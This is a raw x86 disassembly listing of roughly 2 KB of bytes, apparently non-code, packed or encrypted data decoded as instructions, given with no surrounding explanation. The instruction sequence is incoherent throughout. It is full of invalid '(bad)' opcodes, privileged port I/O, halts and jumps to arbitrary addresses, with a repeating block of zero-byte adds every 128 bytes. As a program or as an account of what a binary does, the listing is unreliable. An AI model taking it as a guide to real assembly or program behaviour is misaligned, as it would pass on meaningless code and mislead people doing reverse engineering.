  42214d:	sbb    esp,eax
  42214f:	loop   0x42216c
  422151:	xchg   esi,eax
  422152:	neg    DWORD PTR [edx-0x16]
  422155:	pusha  
  422156:	mov    bl,0x89
  422158:	mov    bh,0xa4
  42215a:	aaa    
  42215b:	sub    DWORD PTR [edi+0x48],0x62a2b495
  422162:	imul   ebx,DWORD PTR [ebx+0x7f],0xac6d690f
  422169:	pop    ds
  42216a:	adc    DWORD PTR [ebp+0x74136644],eax
  422170:	mov    ah,BYTE PTR [ecx-0xaf89b50]
  422176:	sub    eax,DWORD PTR [edi]
  422178:	or     DWORD PTR [edx-0x24c16019],edx
  42217e:	xor    al,0x5c
  422180:	cmp    al,0x74
  422182:	add    al,0xa5
  422184:	aaa    
  422185:	ror    BYTE PTR gs:[edx-0x429567e1],1
  42218c:	add    BYTE PTR [eax],al
  42218e:	add    BYTE PTR [eax],al
  422190:	add    BYTE PTR [eax],al
  422192:	fnstenv [esi-0x2490e49a]
  422198:	std    
  422199:	neg    BYTE PTR [esi]
  42219b:	sub    esp,DWORD PTR [ebx-0x23]
  42219e:	in     al,0xa5
  4221a0:	mov    WORD PTR [edi],es
  4221a2:	xchg   ecx,eax
  4221a3:	fadd   DWORD PTR [ecx]
  4221a5:	add    BYTE PTR [edx+0x0],ah
  4221a8:	add    BYTE PTR [eax],al
  4221aa:	pop    edx
  4221ab:	mov    ebx,0x8f0dc9f3
  4221b0:	data16 cmc 
  4221b2:	push   ebp
  4221b3:	mov    ds:0x56ed47a1,al
  4221b8:	sub    edi,DWORD PTR [ebp-0x3996fe56]
  4221be:	sub    esp,edi
  4221c0:	fisub  WORD PTR [eax+ebx*2]
  4221c3:	inc    edx
  4221c4:	fisttp DWORD PTR [ecx]
  4221c6:	test   BYTE PTR [edi+0x5a],dh
  4221c9:	and    BYTE PTR [ecx+0x2acd81fb],0x4c
  4221d0:	cli    
  4221d1:	ins    BYTE PTR es:[edi],dx
  4221d2:	mov    esp,0xa8299966
  4221d7:	in     al,dx
  4221d8:	nop
  4221d9:	and    BYTE PTR [eax+0x52a8e573],0xdb
  4221e0:	cli    
  4221e1:	scas   al,BYTE PTR es:[edi]
  4221e2:	ds sahf 
  4221e4:	in     al,dx
  4221e5:	mov    BYTE PTR [eax-0x54],cl
  4221e8:	outs   dx,DWORD PTR ds:[esi]
  4221e9:	or     al,0xee
  4221eb:	adc    al,0xd7
  4221ed:	or     bh,BYTE PTR [ecx]
  4221ef:	xchg   DWORD PTR [edi+0x17e6b098],ebx
  4221f5:	adc    dh,BYTE PTR [eax+0x27ba1f74]
  4221fb:	adc    edi,DWORD PTR [eax-0x59b5d96]
  422201:	and    al,0x7e
  422203:	push   ds
  422204:	mov    al,0x5d
  422206:	lods   al,BYTE PTR ds:[esi]
  422207:	mov    ecx,0x5dba6577
  42220c:	add    BYTE PTR [eax],al
  42220e:	add    BYTE PTR [eax],al
  422210:	add    BYTE PTR [eax],al
  422212:	fidiv  DWORD PTR [edx]
  422214:	xchg   edi,eax
  422215:	mov    bh,bh
  422217:	scas   eax,DWORD PTR es:[edi]
  422218:	fbstp  TBYTE PTR [edx+0x3]
  42221b:	inc    ebp
  42221c:	mov    ds:0x75ac095c,eax
  422221:	stc    
  422222:	repz fadd DWORD PTR [ecx]
  422225:	add    BYTE PTR [edx+0x0],ah
  422228:	add    BYTE PTR [eax],al
  42222a:	sbb    al,0xce
  42222c:	xchg   esi,eax
  42222d:	inc    ebx
  42222e:	jbe    0x422251
  422230:	pop    edx
  422231:	sub    DWORD PTR [edx-0x41],ecx
  422234:	adc    ebp,ecx
  422236:	push   es
  422237:	add    BYTE PTR [ebp-0x7d742532],ch
  42223d:	aaa    
  42223e:	push   edi
  42223f:	push   ds
  422240:	cmp    bl,bl
  422242:	and    esp,DWORD PTR [ecx+ebx*8+0xd]
  422246:	data16 cmp BYTE PTR [esi],al
  422249:	bound  eax,QWORD PTR [eax]
  42224b:	and    dh,BYTE PTR [esi-0x4ab96a02]
  422251:	retf   0x203c
  422254:	shl    BYTE PTR [edx+0x32],1
  422257:	mov    DWORD PTR [esi-0x3694e3a5],ecx
  42225d:	imul   eax,DWORD PTR [ebx],0x5071164d
  422263:	dec    ebx
  422264:	dec    ebx
  422265:	jns    0x4222bd
  422267:	mov    ch,0xd4
  422269:	mov    dh,0xd6
  42226b:	outs   dx,DWORD PTR ds:[esi]
  42226c:	pop    edx
  42226d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42226e:	inc    ebp
  42226f:	sbb    BYTE PTR ds:[ebp+0x574f3323],0x22
  422277:	jne    0x422208
  422279:	xchg   esi,eax
  42227b:	and    DWORD PTR [esi-0x40],edx
  42227e:	int3   
  42227f:	push   ebp
  422280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422281:	rcr    DWORD PTR [ebx-0x6e],0x13
  422285:	sub    BYTE PTR [edx+ebp*8],bh
  422288:	stos   BYTE PTR es:[edi],al
  422289:	pop    es
  42228a:	les    ecx,FWORD PTR [eax+eax*1]
  42228d:	add    BYTE PTR [eax],al
  42228f:	add    BYTE PTR [eax],al
  422291:	add    BYTE PTR [eax-0x1c],cl
  422294:	add    ebx,DWORD PTR [ebx-0x8270051]
  42229a:	pop    esi
  42229b:	sub    BYTE PTR [eax+0x36dda68f],bl
  4222a1:	out    0x55,eax
  4222a3:	fld    DWORD PTR [ecx]
  4222a5:	add    BYTE PTR [edx+0x0],ah
  4222a8:	add    BYTE PTR [eax],al
  4222aa:	sub    BYTE PTR [eax+ecx*1-0x3b],ah
  4222ae:	in     al,dx
  4222af:	and    eax,0x715ae7db
  4222b4:	mov    al,0x54
  4222b6:	call   0xe37bd3aa
  4222bb:	addr16 mov al,cl
  4222be:	mov    BYTE PTR [edx+0x48048fd1],dl
  4222c4:	sbb    eax,0xe74f3dba
  4222c9:	dec    esp
  4222ca:	mov    eax,?
  4222cc:	sar    BYTE PTR [ebx],1
  4222ce:	sub    eax,0x1128d715
  4222d3:	jo     0x4222d5
  4222d5:	nop
  4222d6:	mov    edi,0x654d4326
  4222db:	ss xchg esp,eax
  4222dd:	push   cs
  4222de:	mov    eax,ds:0x561ae5a5
  4222e3:	setae  BYTE PTR [esi+0x488f72e8]
  4222ea:	pop    edi
  4222eb:	test   DWORD PTR [eax],esi
  4222ed:	jecxz  0x422330
  4222ef:	lds    esi,FWORD PTR [esi]
  4222f1:	daa    
  4222f2:	in     eax,0xb
  4222f4:	data16 lods al,BYTE PTR gs:[esi]
  4222f7:	pop    ds
  4222f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222f9:	cmp    esi,0xc3cb5a41
  4222ff:	inc    ebp
  422300:	loopne 0x42234a
  422302:	fcmovu st,st(4)
  422304:	iret   
  422305:	dec    edi
  422306:	nop
  422307:	lock mul DWORD PTR [ecx]
  42230a:	mov    edi,0xc5
  42230f:	add    BYTE PTR [eax],al
  422311:	add    BYTE PTR [edx+0x4],dl
  422314:	mov    ds:0x72a6f682,al
  422319:	aam    0x6d
  42231b:	xor    dh,BYTE PTR [edx]
  42231d:	and    eax,0xf02d5f34
  422322:	mov    bh,0xd9
  422324:	add    DWORD PTR [eax],eax
  422326:	bound  eax,QWORD PTR [eax]
  422328:	add    BYTE PTR [eax],al
  42232a:	pop    edi
  42232b:	add    BYTE PTR [edx+0x7c3b9278],ch
  422331:	sub    edi,0xffffffcc
  422334:	xchg   esi,eax
  422335:	inc    ecx
  422336:	nop
  422337:	cdq    
  422338:	rcr    edi,cl
  42233a:	out    dx,eax
  42233b:	xchg   ecx,eax
  42233c:	add    bh,BYTE PTR [edx+0x2b]
  42233f:	sbb    edi,DWORD PTR [ebp+0x75874ce6]
  422345:	test   eax,0x490ce6fd
  42234a:	push   cs
  42234b:	outs   dx,BYTE PTR ds:[esi]
  42234c:	push   es
  42234d:	cmp    eax,0xc4409be2
  422352:	jmp    0x422369
  422354:	loopne 0x422378
  422356:	dec    ecx
  422357:	dec    ebx
  422358:	mov    bh,0x26
  42235a:	dec    ecx
  42235b:	inc    eax
  42235c:	imul   eax,DWORD PTR [eax+0x3b68861c],0xab3d67e
  422366:	loope  0x42234a
  422368:	sbb    BYTE PTR [ecx],ah
  42236a:	inc    ecx
  42236b:	retf   
  42236c:	pop    esi
  42236d:	jae    0x42236c
  42236f:	inc    edx
  422370:	pop    ecx
  422371:	imul   esi,DWORD PTR [esi-0x12],0xc45962a0
  422378:	aam    0x86
  42237a:	fs ss cli 
  42237d:	leave  
  42237e:	fldenv [ebp-0x6a396c18]
  422384:	cdq    
  422385:	std    
  422386:	nop
  422387:	cmp    bh,bl
  422389:	or     ch,ch
  42238b:	nop
  42238c:	add    BYTE PTR [eax],al
  42238e:	add    BYTE PTR [eax],al
  422390:	add    BYTE PTR [eax],al
  422392:	cmp    BYTE PTR [edx-0x6a],ch
  422395:	add    edx,esi
  422397:	(bad)  
  422398:	mov    ebp,0xdb4ef67b
  42239d:	out    0x9,eax
  42239f:	sub    al,0xae
  4223a1:	push   ebx
  4223a2:	sbb    edx,ebx
  4223a4:	add    DWORD PTR [eax],eax
  4223a6:	bound  eax,QWORD PTR [eax]
  4223a8:	add    BYTE PTR [eax],al
  4223aa:	and    ebp,DWORD PTR [esi+0x1b689b7a]
  4223b0:	test   esi,ebx
  4223b2:	jo     0x4223a4
  4223b4:	add    ebx,DWORD PTR [ecx+0x5e]
  4223b7:	repz aas 
  4223b9:	rol    DWORD PTR [edi],0xca
  4223bc:	scas   al,BYTE PTR es:[edi]
  4223bd:	rol    ecx,0xb6
  4223c0:	add    al,ah
  4223c2:	jmp    0x422402
  4223c4:	in     al,dx
  4223c5:	sbb    al,0x6
  4223c7:	mov    ch,0x4f
  4223c9:	jbe    0x422385
  4223cb:	fmul   DWORD PTR [ebp+0x45]
  4223ce:	push   cs
  4223cf:	mul    DWORD PTR [ecx+0x24]
  4223d2:	lea    ebp,[esi+0x16]
  4223d5:	jg     0x4223c5
  4223d7:	hlt    
  4223d8:	adc    al,0xde
  4223da:	mov    al,0x6d
  4223dc:	cmp    BYTE PTR [ebx+ebx*4+0x52],dl
  4223e0:	mov    ebx,0xd37b63cf
  4223e5:	sub    ch,al
  4223e7:	xor    eax,0x4bdd78a3
  4223ec:	(bad)  
  4223ed:	fisttp QWORD PTR [esi+0x61]
  4223f0:	jmp    0x43e2:0xb57acf71
  4223f7:	icebp  
  4223f8:	mov    al,0x48
  4223fa:	add    al,0x75
  4223fc:	leave  
  4223fd:	xchg   DWORD PTR [esi+0x24e47b31],edx
  422403:	sahf   
  422404:	fild   QWORD PTR [ecx+0x47]
  422407:	loope  0x422392
  422409:	rcl    bl,1
  42240b:	popa   
  42240c:	add    BYTE PTR [eax],al
  42240e:	add    BYTE PTR [eax],al
  422410:	add    BYTE PTR [eax],al
  422412:	jmp    0x7a729ed0
  422417:	repz jmp 0x422413
  42241a:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42241e:	(bad)  
  42241f:	adc    ecx,esi
  422421:	mov    edi,0x1da7b
  422426:	bound  eax,QWORD PTR [eax]
  422428:	add    BYTE PTR [eax],al
  42242a:	cwde   
  42242b:	jl     0x422428
  42242d:	shl    dl,1
  42242f:	ds push es
  422431:	adc    al,0xaa
  422433:	jno    0x42242b
  422435:	clc    
  422436:	dec    ebx
  422437:	outs   dx,BYTE PTR ds:[esi]
  422438:	xor    ch,BYTE PTR [ebp+0x77700b01]
  42243e:	push   eax
  42243f:	sub    edi,DWORD PTR [edx-0x5]
  422442:	(bad)  
  422443:	scas   al,BYTE PTR es:[edi]
  422444:	(bad)  [ecx+0xacc664e]
  42244a:	enter  0xe1f2,0x9a
  42244e:	std    
  42244f:	sub    BYTE PTR [edx+0x21737541],al
  422455:	jnp    0x4223da
  422457:	popa   
  422458:	xor    ch,dh
  42245a:	add    ebp,DWORD PTR [ecx-0x6e44af1f]
  422460:	(bad)  
  422461:	push   ss
  422462:	and    BYTE PTR [edi-0x3373232b],dl
  422468:	pusha  
  422469:	(bad)  
  42246a:	cdq    
  42246b:	mov    dl,0x47
  42246d:	push   esi
  42246e:	pop    eax
  42246f:	lock pop esi
  422471:	xor    al,0x46
  422473:	dec    ebp
  422474:	adc    eax,0x70e47f0c
  422479:	in     al,dx
  42247a:	outs   dx,DWORD PTR ds:[esi]
  42247b:	jo     0x42244e
  42247d:	xchg   esi,eax
  42247e:	push   edx
  42247f:	adc    al,0xc9
  422481:	enter  0xb3a4,0x1d
  422485:	and    eax,0x3ad357e2
  42248a:	ins    DWORD PTR es:[edi],dx
  42248b:	add    BYTE PTR es:[eax],al
  42248e:	add    BYTE PTR [eax],al
  422490:	add    BYTE PTR [eax],al
  422492:	pop    ebx
  422493:	inc    ecx
  422494:	pop    ebx
  422495:	iret   
  422496:	pop    ebx
  422497:	(bad)  
  422499:	aad    0xf
  42249b:	ss dec esp
  42249d:	dec    esi
  42249e:	leave  
  42249f:	lea    eax,ds:0x1dadde5
  4224a5:	add    BYTE PTR [edx+0x0],ah
  4224a8:	add    BYTE PTR [eax],al
  4224aa:	stos   BYTE PTR es:[edi],al
  4224ab:	bound  eax,QWORD PTR [ebx]
  4224ad:	stos   BYTE PTR es:[edi],al
  4224ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224af:	icebp  
  4224b0:	xor    edi,edx
  4224b2:	sbb    eax,0x81fa1736
  4224b7:	pop    esi
  4224b8:	adc    DWORD PTR [eax-0x3d9b7005],esp
  4224be:	push   esi
  4224bf:	sub    eax,0xa450385d
  4224c4:	mov    dl,0xde
  4224c6:	xchg   edi,eax
  4224c7:	dec    ebp
  4224c8:	icebp  
  4224c9:	jp     0x42245d
  4224cb:	cdq    
  4224cc:	lock outs dx,BYTE PTR ds:[esi]
  4224ce:	pop    ebp
  4224cf:	loop   0x4224e2
  4224d1:	out    0x69,eax
  4224d3:	cmp    dh,BYTE PTR [edx+0x2a3d1b75]
  4224d9:	shl    cl,1
  4224db:	dec    ebx
  4224dc:	retf   0x26c5
  4224df:	push   eax
  4224e0:	repnz leave 
  4224e2:	ins    DWORD PTR es:[edi],dx
  4224e3:	adc    BYTE PTR [eax-0x12],bl
  4224e6:	cmc    
  4224e7:	aaa    
  4224e8:	mov    ch,BYTE PTR [ebp+0x79]
  4224eb:	hlt    
  4224ec:	dec    ebx
  4224ed:	(bad)  [ebp-0x19b33e38]
  4224f3:	ret    0x1739
  4224f6:	mov    ds:0xa06c5ab7,eax
  4224fb:	mov    al,ds:0x6d117793
  422500:	add    eax,0x26d93b43
  422505:	sar    DWORD PTR [eax],1
  422507:	push   ds
  422508:	cmc    
  422509:	add    bl,bl
  42250b:	lods   al,BYTE PTR ds:[esi]
  42250c:	add    BYTE PTR [eax],al
  42250e:	add    BYTE PTR [eax],al
  422510:	add    BYTE PTR [eax],al
  422512:	fwait
  422513:	test   DWORD PTR [ebp+0x3c],esp
  422516:	jg     0x422514
  422518:	(bad)  [edi-0x65be08a1]
  42251e:	in     al,0xc1
  422520:	lods   eax,DWORD PTR ds:[esi]
  422521:	dec    eax
  422522:	aas    
  422523:	fild   DWORD PTR [ecx]
  422525:	add    BYTE PTR [edx+0x0],ah
  422528:	add    BYTE PTR [eax],al
  42252a:	jnp    0x4224d2
  42252c:	or     dh,BYTE PTR [ebx+ebp*8]
  42252f:	addr16 jmp 0xfe3dcc8f
  422535:	mov    cl,0x93
  422537:	in     eax,dx
  422538:	sbb    ecx,ebx
  42253a:	out    dx,al
  42253b:	xchg   edi,eax
  42253c:	addr16 add esi,edi
  42253f:	gs push eax
  422541:	fcomip st,st(7)
  422543:	test   DWORD PTR [edi+ebx*1-0x33f7b1f5],edi
  42254a:	test   al,0xfe
  42254c:	mov    ah,0xfc
  42254e:	addr16 fsubrp st(3),st
  422551:	mov    DWORD PTR [ecx],esi
  422553:	popa   
  422554:	dec    eax
  422555:	or     ebp,esi
  422557:	cmp    ebx,DWORD PTR [ecx+0x2e]
  42255a:	xchg   esp,eax
  42255b:	jecxz  0x422572
  42255d:	xchg   BYTE PTR [eax+0x11],cl
  422560:	test   eax,0x76a81a10
  422565:	jb     0x422559
  422567:	xor    al,0xc5
  422569:	sbb    eax,0x1a72acec
  42256e:	sub    eax,0xa58c39c0
  422573:	or     eax,0x992f9ea2
  422578:	addr16 inc esi
  42257b:	icebp  
  42257c:	xchg   ecx,eax
  42257d:	js     0x422557
  42257f:	rol    dh,1
  422581:	scas   al,BYTE PTR es:[edi]
  422582:	inc    esp
  422583:	ficomp WORD PTR [edi-0x2e]
  422586:	pop    esp
  422587:	js     0x4225f5
  422589:	fld    TBYTE PTR [edi+0x15]
  42258c:	add    BYTE PTR [eax],al
  42258e:	add    BYTE PTR [eax],al
  422590:	add    BYTE PTR [eax],al
  422592:	outs   dx,BYTE PTR ds:[esi]
  422593:	jae    0x422585
  422595:	retf   0xcbfd
  422598:	jle    0x422591
  42259a:	repz xor eax,0xb5e78ce9
  4225a0:	into   
  4225a1:	test   DWORD PTR [ecx+0x620001db],esp
  4225a7:	add    BYTE PTR [eax],al
  4225a9:	add    BYTE PTR [eax],dh
  4225ab:	jle    0x4225e3
  4225ad:	lods   eax,DWORD PTR ds:[esi]
  4225ae:	jg     0x422605
  4225b0:	pop    ecx
  4225b1:	cli    
  4225b2:	push   es
  4225b3:	fdivr  DWORD PTR [ebp+0x6]
  4225b6:	jmp    0x19a408fc
  4225bb:	into   
  4225bc:	test   BYTE PTR [esi],ah
  4225be:	stc    
  4225bf:	or     DWORD PTR ds:0x9480c40,edi
  4225c5:	repnz mov ah,0x6c
  4225c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225c9:	adc    dh,dh
  4225cb:	hlt    
  4225cc:	stc    
  4225cd:	sahf   
  4225ce:	sbb    BYTE PTR [edx+eiz*8],0xc7
  4225d2:	in     al,0x8d
  4225d4:	or     esp,DWORD PTR ds:0x397669a4
  4225da:	cli    
  4225db:	push   edi
  4225dc:	and    BYTE PTR [edx+0x1c667858],bh
  4225e2:	(bad)  
  4225e4:	sbb    al,ah
  4225e6:	clc    
  4225e7:	jae    0x422626
  4225e9:	std    
  4225ea:	outs   dx,BYTE PTR ds:[esi]
  4225eb:	or     eax,0x87a6ac44
  4225f0:	inc    ecx
  4225f1:	xchg   esp,eax
  4225f2:	fisttp WORD PTR [eax]
  4225f4:	jne    0x4225eb
  4225f6:	push   0x2c
  4225f8:	sbb    DWORD PTR [esp],ebp
  4225fb:	mov    edx,0x661c55d4
  422600:	inc    BYTE PTR [ecx+0x34]
  422603:	addr16 pop edi
  422605:	sbb    edi,DWORD PTR [edx+0xf1bd99b]
  42260b:	push   cs
  42260c:	add    BYTE PTR [eax],al
  42260e:	add    BYTE PTR [eax],al
  422610:	add    BYTE PTR [eax],al
  422612:	cmc    
  422613:	adc    al,0xae
  422615:	adc    ebp,edi
  422617:	mov    ebx,0x84e6f6fd
  42261c:	lds    ebp,FWORD PTR [edx+0xaab230a]
  422622:	add    ebx,esp
  422624:	add    DWORD PTR [eax],eax
  422626:	bound  eax,QWORD PTR [eax]
  422628:	add    BYTE PTR [eax],al
  42262a:	pop    esi
  42262b:	ficom  DWORD PTR [ecx]
  42262d:	ficomp WORD PTR [ecx-0x1f4f9a59]
  422633:	mov    ebx,edi
  422635:	jno    0x422687
  422637:	ret    0xc53e
  42263a:	xor    DWORD PTR [edx+0x64],edx
  42263d:	push   0xd23f6b9c
  422642:	push   esi
  422643:	push   ebx
  422644:	xor    ebx,ecx
  422646:	mov    esi,0x691c7c76
  42264b:	sub    BYTE PTR [ebp+0x22],0xf6
  42264f:	loop   0x4225f7
  422651:	and    BYTE PTR [edi-0x15],ah
  422654:	cwde   
  422655:	adc    DWORD PTR [ecx-0x69],ecx
  422658:	into   
  422659:	scas   eax,DWORD PTR es:[edi]
  42265a:	add    ah,bh
  42265c:	sbb    al,0x60
  42265e:	cmp    DWORD PTR [esi+0x42],ecx
  422661:	repz inc eax
  422663:	imul   ecx,ebp,0x49de40d1
  422669:	sub    bl,ch
  42266b:	jnp    0x422606
  42266d:	sub    ecx,DWORD PTR ds:0xea249b88
  422673:	pop    es
  422674:	ficom  WORD PTR [edi+eax*2-0x60ce1a7d]
  42267b:	repz pop es
  42267d:	or     dh,BYTE PTR [ebx+0xe]
  422680:	adc    cl,bl
  422682:	push   ds
  422683:	mov    ch,0xaa
  422685:	and    dh,BYTE PTR [ecx]
  422687:	xchg   DWORD PTR [ebx-0x36],ebx
  42268a:	sti    
  42268b:	test   DWORD PTR [eax],0x0
  422691:	add    BYTE PTR [ebx],bh
  422693:	mov    cl,0x57
  422695:	lock fcomip st,st(6)
  422698:	mov    edi,0xbb1c16fb
  42269d:	shr    BYTE PTR [ebp+0x65d675ff],0xdc
  4226a4:	add    DWORD PTR [eax],eax
  4226a6:	bound  eax,QWORD PTR [eax]
  4226a8:	add    BYTE PTR [eax],al
  4226aa:	aam    0x9b
  4226ac:	loopne 0x422685
  4226ae:	jge    0x4226ee
  4226b0:	retf   
  4226b1:	dec    ebx
  4226b2:	jp     0x42264f
  4226b4:	sub    edx,DWORD PTR [ebp+0x1d2b3ce]
  4226ba:	mov    bh,0x8b
  4226bc:	rcl    DWORD PTR [esi],cl
  4226be:	mov    bl,0xe
  4226c0:	sub    eax,DWORD PTR [ebx-0x6c42ac07]
  4226c6:	cmp    BYTE PTR [ebx+0x3c],dl
  4226c9:	dec    eax
  4226ca:	lds    esp,FWORD PTR [ebx-0x68efa398]
  4226d0:	(bad)  [edx]
  4226d2:	outs   dx,DWORD PTR ds:[esi]
  4226d3:	nop
  4226d4:	cmp    eax,0xd93cebbe
  4226d9:	sub    bl,BYTE PTR [ebp-0x224582e0]
  4226df:	pop    esp
  4226e0:	and    ebx,ecx
  4226e2:	neg    DWORD PTR [eax+0x42a47ac8]
  4226e8:	xchg   esp,eax
  4226e9:	sub    BYTE PTR [ebx],ah
  4226eb:	bound  ebx,QWORD PTR [edi]
  4226ed:	ins    BYTE PTR es:[edi],dx
  4226ee:	or     eax,0x98317077
  4226f3:	mov    esi,0xbdcd1d0a
  4226f8:	arpl   di,di
  4226fa:	cld    
  4226fb:	out    dx,al
  4226fc:	mov    ah,0xa2
  4226fe:	mov    edx,0x7d1b7b32
  422703:	dec    ebx
  422704:	loop   0x422746
  422706:	xor    edx,edx
  422708:	fiadd  WORD PTR [edx+eax*4+0x7b]
  42270c:	add    BYTE PTR [eax],al
  42270e:	add    BYTE PTR [eax],al
  422710:	add    BYTE PTR [eax],al
  422712:	aam    0xf
  422714:	push   ecx
  422715:	lock (bad) 
  422718:	cmc    
  422719:	das    
  42271a:	sbb    BYTE PTR [eax],cl
  42271c:	xchg   ebx,eax
  42271d:	iret   
  42271e:	cmp    ebp,DWORD PTR [ecx]
  422720:	sbb    al,0x65
  422722:	(bad)  
  422723:	fadd   QWORD PTR [ecx]
  422725:	add    BYTE PTR [edx+0x0],ah
  422728:	add    BYTE PTR [eax],al
  42272a:	mov    dl,0x3f
  42272c:	outs   dx,BYTE PTR ds:[esi]
  42272d:	sub    esp,DWORD PTR [ebx-0x77728a22]
  422733:	ins    BYTE PTR es:[edi],dx
  422734:	aad    0x5d
  422736:	repz lock aad 0x17
  42273a:	(bad)  
  42273b:	test   DWORD PTR [ebx],0xda430148
  422741:	push   0x98faac2e
  422746:	shl    BYTE PTR [ebx-0x1a],1
  422749:	mov    bh,0xb9
  42274b:	(bad)  
  42274c:	push   0x7c6c8b1b
  422751:	push   ebp
  422752:	push   es
  422753:	adc    al,0x4a
  422755:	(bad)  
  422756:	and    DWORD PTR [esi+0x4eef9bd9],ebx
  42275c:	jne    0x4227bf
  42275e:	xchg   esp,eax
  42275f:	ds repz mov al,0x3e
  422763:	mov    ebx,DWORD PTR [ecx+eiz*1+0x2a38259c]
  42276a:	cld    
  42276b:	es and eax,0x44997ad8
  422771:	push   edi
  422772:	add    ecx,DWORD PTR [ebp+0x2bae5f10]
  422778:	dec    edx
  422779:	cmp    bl,al
  42277b:	ret    0x3173
  42277e:	sbb    eax,0xa7d0f7ae
  422783:	sub    ecx,DWORD PTR [eax+0x3a]
  422786:	pop    edi
  422787:	push   edx
  422788:	arpl   WORD PTR [esi+0xd4c8],bp
  42278e:	add    BYTE PTR [eax],al
  422790:	add    BYTE PTR [eax],al
  422792:	int    0x2d
  422794:	xchg   ebp,eax
  422795:	inc    ebx
  422796:	cmc    
  422797:	sti    
  422798:	fild   QWORD PTR [edi-0x5bdf5fa9]
  42279e:	adc    cl,BYTE PTR [eax-0x22d6f4ee]
  4227a4:	add    DWORD PTR [eax],eax
  4227a6:	bound  eax,QWORD PTR [eax]
  4227a8:	add    BYTE PTR [eax],al
  4227aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227ab:	iret   
  4227ac:	push   ebp
  4227ad:	fisubr DWORD PTR [ecx+0x1d]
  4227b0:	add    bh,BYTE PTR [edx-0x47]
  4227b3:	addr16 (bad) 
  4227b5:	call   0x4baa:0x9e8cdb40
  4227bc:	xchg   ecx,eax
  4227bd:	cmp    al,0xa9
  4227bf:	outs   dx,DWORD PTR ds:[esi]
  4227c0:	jecxz  0x4227c6
  4227c2:	das    
  4227c3:	mov    eax,ds:0x3c64bb5a
  4227c8:	cmp    al,0x4c
  4227ca:	jp     0x422780
  4227cc:	out    dx,eax
  4227cd:	out    dx,eax
  4227ce:	mov    ds:0xc79d7d5e,al
  4227d3:	(bad)  
  4227d4:	lea    eax,ds:0x612de8fe
  4227da:	outs   dx,DWORD PTR ds:[esi]
  4227db:	jle    0x4227d3
  4227dd:	(bad)  
  4227de:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4227e0:	test   al,0x41
  4227e2:	call   0x358d7a7d
  4227e7:	in     eax,dx
  4227e8:	mov    dh,0x96
  4227ea:	jmp    0xb20dd238
  4227ef:	push   ss
  4227f0:	jl     0x4227ee
  4227f2:	pop    ebp
  4227f3:	fcmove st,st(1)
  4227f5:	rcr    ebp,1
  4227f7:	ins    BYTE PTR es:[edi],dx
  4227f8:	jmp    0xb6bd975
  4227fd:	dec    esp
  4227fe:	push   ss
  4227ff:	fmul   st,st(2)
  422801:	xchg   ecx,eax
  422802:	(bad)  
  422803:	pop    ss
  422804:	sbb    DWORD PTR [edi-0x2b],0x35
  422808:	inc    esp
  422809:	frstor ds:0x9d
  42280f:	add    BYTE PTR [eax],al
  422811:	add    BYTE PTR [ebx],dl
  422813:	fs out 0xb,eax
  422816:	test   DWORD PTR [ebx-0xce58301],0x47e74cfc
  422820:	data16 aam 0x8b
  422823:	fld    QWORD PTR [ecx]
  422825:	add    BYTE PTR [edx+0x0],ah
  422828:	add    BYTE PTR [eax],al
  42282a:	out    0x53,eax
  42282c:	jl     0x422807
  42282e:	bound  eax,QWORD PTR [eax-0x2ebe5d2b]
  422834:	(bad)  
  422835:	aam    0xe4
  422837:	mov    WORD PTR [edx+0x71],fs
  42283a:	inc    edi
  42283b:	cs enter 0xe9ad,0x38
  422840:	jno    0x42288b
  422842:	sub    ebp,esp
  422844:	cmp    al,0x25
  422846:	hlt    
  422847:	pop    edi
  422848:	fs push ebp
  42284a:	mov    esp,es
  42284c:	imul   BYTE PTR [esi-0x78]
  42284f:	dec    edx
  422850:	hlt    
  422851:	bound  esi,QWORD PTR [edi-0x68]
  422854:	loope  0x422841
  422856:	fisttp QWORD PTR [edx-0x2f]
  422859:	cmp    al,0x94
  42285b:	js     0x422862
  42285d:	shl    DWORD PTR ds:0xc55ebdd5,1
  422863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422864:	jmp    0x25eb5cf3
  422869:	rol    BYTE PTR [ebp-0xe],cl
  42286c:	mov    ds:0xa9c616d7,al
  422871:	adc    BYTE PTR [ebp-0x2752e3b4],0xb1
  422878:	sbb    eax,0xa9f6bc63
  42287d:	loope  0x422863
  42287f:	mov    ebx,0x6e8fe9f1
  422884:	sub    eax,0x3dfdfdaf
  422889:	retf   
  42288a:	loop   0x4228ba
  42288c:	add    BYTE PTR [eax],al
  42288e:	add    BYTE PTR [eax],al
  422890:	add    BYTE PTR [eax],al
  422892:	daa    
  422893:	push   ecx
  422894:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  42289e:	int    0x7a
  4228a0:	into   
  4228a1:	imul   ebp,ebp,0x620001dd
  4228a7:	add    BYTE PTR [eax],al
  4228a9:	add    BYTE PTR [edi],cl
  4228ab:	fild   DWORD PTR [edi+eiz*8-0x47]
  4228af:	(bad)  
  4228b1:	xchg   ecx,eax
  4228b2:	sub    DWORD PTR [edi],0x3f785f0f
  4228b8:	lods   al,BYTE PTR ds:[esi]
  4228b9:	inc    edi
  4228ba:	out    dx,al
  4228bb:	shr    dl,0x26
  4228be:	std    
  4228bf:	imul   edi,esi,0x8cbb605b
  4228c5:	cdq    
  4228c6:	jo     0x4228e1
  4228c8:	out    dx,al
  4228c9:	inc    edx
  4228ca:	mov    ds:0x1e0ab3af,al
  4228cf:	inc    ecx
  4228d0:	jo     0x422931
  4228d2:	stos   BYTE PTR es:[edi],al
  4228d3:	retf   0x52d9
  4228d6:	pop    edi
  4228d7:	sub    edx,eax
  4228d9:	mov    esi,0x53227d2e
  4228de:	fs lods al,BYTE PTR cs:[esi]
  4228e1:	or     ebx,DWORD PTR [edx]
  4228e3:	repz mov fs,WORD PTR [ecx+0x54]
  4228e7:	mov    ds:0x1eacd29,eax
  4228ec:	mov    eax,0xc7fa449f
  4228f1:	call   0x622349de
  4228f6:	loop   0x422901
  4228f8:	enter  0xfdd2,0x2d
  4228fc:	pushf  
  4228fd:	jmp    0xc033:0x4134c4f4
  422904:	jge    0x4228d9
  422906:	and    BYTE PTR ds:0x8233fc53,cl
